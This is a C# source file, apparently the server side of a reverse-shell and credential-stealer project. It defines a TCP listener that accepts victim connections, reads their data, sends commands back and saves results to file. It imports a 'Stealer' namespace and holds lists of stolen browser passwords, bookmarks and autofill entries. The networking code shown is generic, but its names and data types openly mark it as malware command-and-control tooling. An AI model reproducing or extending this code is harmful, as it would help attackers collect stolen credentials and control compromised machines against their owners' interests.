﻿using Newtonsoft.Json;
using Stealer;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Stealer.Common;

namespace ReverseShellServer
{

    class TcpServer
    {
        private static List<Password> passwordList = new List<Password>();
        private static List<Bookmark> bookmarkList = new List<Bookmark>();
        private static List<AutoFill> autofillList = new List<AutoFill>();
        public TcpListener TcpListener { get; set; }
        public IPAddress Ip { get; set; }
        public int Port { get; set; }

        public event EventHandler<ClientConnectedArgs> ClientConnectedEvent;
        public event EventHandler ClientDisconnectedEvent;
        public event EventHandler<DataRecievedArgs> DataRecievedEvent;

        public Dictionary<string, TcpClient> ClientMap = new Dictionary<string, TcpClient>();

        public TcpServer(IPAddress _ip, int _port)
        {
            Ip = _ip;
            Port = _port;

            TcpListener = new TcpListener(Ip, this.Port);
        }

        public TcpServer(int _port)
        {
            Ip = IPAddress.Any;
            Port = _port;

            TcpListener = new TcpListener(IPAddress.Any, Port);
        }

        public async void StartListening(CancellationToken cancellationToken)
        {
            TcpListener.Start();

            cancellationToken.Register(() => {
                TcpListener.Stop();
                Console.WriteLine("Stop Listener");
            });

            // Handle client connections and disconnections
            ClientConnectedEvent += (object sender, ClientConnectedArgs e) =>
            {
                ClientMap.Add(e.Client.Client.RemoteEndPoint.ToString(), e.Client);
                Console.WriteLine("Client connected.");
            };

            ClientDisconnectedEvent += (object sender, EventArgs e) =>
            {
                TcpClient client = sender as TcpClient;
                ClientMap.Remove(client.Client.RemoteEndPoint.ToString());
                Console.WriteLine("Client disconnected.");

            };

            while (!cancellationToken.IsCancellationRequested)
            {
                TcpClient client = await TcpListener.AcceptTcpClientAsync();

                var childSocketThread = Task.Run(() =>
                {
                    HandleClient(client, cancellationToken);
                });

                ClientConnectedArgs connectionArgs = new ClientConnectedArgs
                {
                    Client = client,
                    Task = childSocketThread
                };
                ClientConnectedEvent(client, connectionArgs);
                // childSocketThread.Start();
            }
        }


        private async void HandleClient(TcpClient client, CancellationToken cancellationToken)
        {
            List<string> receivedData = new List<string>();

            while (client.Connected && !cancellationToken.IsCancellationRequested)
            {
                Console.WriteLine(!cancellationToken.IsCancellationRequested);

                //---get the incoming data through a network stream---
                NetworkStream nwStream = client.GetStream();

                byte[] buffer = new byte[client.ReceiveBufferSize];

                try
                {
                    
                    //---read incoming stream---
                    int bytesRead = nwStream.Read(buffer, 0, client.ReceiveBufferSize);
                    Console.WriteLine($"Bytes recieved: {bytesRead}");
                    if (bytesRead == 0)
                    {
                        Thread.Sleep(1000);
                        break;
                    }
                    //---convert the data received into a string---
                    string dataReceived = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                    DataRecievedArgs dataArgs = new DataRecievedArgs();
                    dataArgs.Data = dataReceived;
                    DataRecievedEvent(client, dataArgs);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }

            Console.WriteLine("Client disconnected");
            ClientDisconnectedEvent(client, new EventArgs());
        }

        public void SendData(TcpClient client, string data)
        {

            int byteCount = Encoding.ASCII.GetByteCount(data);
            byte[] sendData = Encoding.ASCII.GetBytes(data);

            Console.WriteLine($"Send {byteCount}B of data: {data} to {client.Client.RemoteEndPoint}");
            NetworkStream stream = client.GetStream();
            stream.Write(sendData, 0, sendData.Length);

            //stream.Close();
        }
        static void SaveToFile(string fileName, string content)
        {
            try
            {
                File.WriteAllText(fileName, content);
                Console.WriteLine($"Data saved to {fileName}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error saving to {fileName}: {ex.Message}");
            }
        }
    }

    public class ClientConnectedArgs : EventArgs
    {
        public TcpClient Client { get; set; }
        public Task Task { get; set; }
    }

    class DataRecievedArgs : EventArgs
    {
        public string Data { get; set; }
    }
   
}
